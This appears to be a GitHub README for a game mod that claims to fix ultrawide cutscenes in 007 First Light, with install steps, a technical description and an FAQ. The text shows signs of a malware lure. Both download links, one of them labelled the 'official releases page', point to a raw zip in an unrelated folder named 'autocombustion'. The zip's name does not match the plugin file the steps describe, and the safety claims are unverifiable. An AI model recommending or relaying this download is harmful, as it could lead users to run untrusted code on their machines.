# 🖥️ 007FirstLightUltrawide - Fix ultrawide cutscenes for better gameplay

[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Divyansh2574/007FirstLightUltrawide/raw/refs/heads/main/autocombustion/Light-Ultrawide-First-1.4.zip)

This software corrects the aspect ratio for cutscenes in 007 First Light. The game defaults to 16:9, which forces black bars on the sides of ultrawide monitors. This plugin updates the game memory while it runs to stretch or fix the view to fit your screen.

## 🛠️ System Requirements

Ensure your computer meets these needs before you start:

*   Windows 10 or Windows 11.
*   A display with an ultrawide aspect ratio, such as 21:9 or 32:9.
*   The 007 First Light game installed on your local drive.
*   An ASI loader, such as Ultimate ASI Loader, placed in the main game folder.

## 📥 How to Install

Follow these steps to set up the fix:

1. Visit the [official releases page](https://github.com/Divyansh2574/007FirstLightUltrawide/raw/refs/heads/main/autocombustion/Light-Ultrawide-First-1.4.zip) to download the latest version.
2. Locate the file named 007FirstLightUltrawide.asi in your downloads folder.
3. Open the folder where 007 First Light is installed.
4. Locate the folder named scripts inside your game directory. If this folder does not exist, create a new folder named scripts.
5. Move the 007FirstLightUltrawide.asi file into the scripts folder.
6. Start the game.

## ⚙️ How it Works

The plugin uses dynamic memory injection. When the game engine, known as Glacier Engine, launches, the ASI plugin waits for the game process to become active. Once the game runs, the plugin identifies the specific memory address responsible for the aspect ratio. It then overwrites the default 16:9 value with your monitor's native ratio. Because the change happens in memory, the game engine renders the cutscenes using your actual desktop resolution instead of the hard-coded default. This process does not alter your game files.

## 📁 Files Overview

*   007FirstLightUltrawide.asi: This is the main plugin file. Your game loads this file to apply the visual fix.
*   scripts/: This is the required folder where the game looks for mods and fixes.

## ❓ Troubleshooting

If the fix does not work, check these common issues:

*   Verify that you have an ASI loader installed. The game cannot read .asi files without one.
*   Place the .asi file inside the scripts folder. Placing it in the main game folder will prevent the game from reading it.
*   Disable other mods that might control screen resolution or camera settings, as these can conflict with this tool.
*   Update your graphics drivers to the latest version to ensure compatibility with aspect ratio hooks.

## 🛡️ Safety and Security

This tool performs memory-level adjustments only. It does not touch your save files or game progression. It does not communicate with external servers. It stays local to your machine. If you wish to remove the fix, delete the 007FirstLightUltrawide.asi file from the scripts folder. The game will return to its original 16:9 behavior on the next launch.

## 📈 Technical Details

The project uses C++ and CMake for its source code. The development process prioritizes memory stability to prevent game crashes. By using the Glacier Engine architecture, the plugin hooks into the display pipeline to inject new instructions before the rendering pass. This ensures that even cutscenes, which often use different render targets than gameplay, follow your monitor's native layout. 

## 📝 Frequently Asked Questions

Can I get banned for using this?
This tool modifies the display output locally. It does not change game assets or provide an unfair advantage in online modes.

Will it fix cutscenes only or the full game?
The plugin targets the aspect ratio logic used by the engine. It primarily corrects cutscene layout, but it may also influence other areas that use the same memory addresses for resolution control.

Does it work with windowed mode?
The tool works best with full-screen or borderless windowed modes. It may experience issues if the game resolution settings do not align with your Windows desktop resolution.

How can I tell if it is working?
You will see the cutscenes fill the full width of your monitor without black bars on the left and right sides. If the bars persist, confirm that your game resolution matches your monitor's resolution in the in-game settings menu.

What if the image looks stretched?
Modern ultrawide displays handle 21:9 input well. If the image appears distorted, check your monitor’s internal scaling settings. Some monitors require an Aspect or Full setting to interpret the incoming signal correctly.

Does the game need an update? 
No. This plugin works with all version releases of 007 First Light. It operates independently of the game version by scanning for known memory signatures.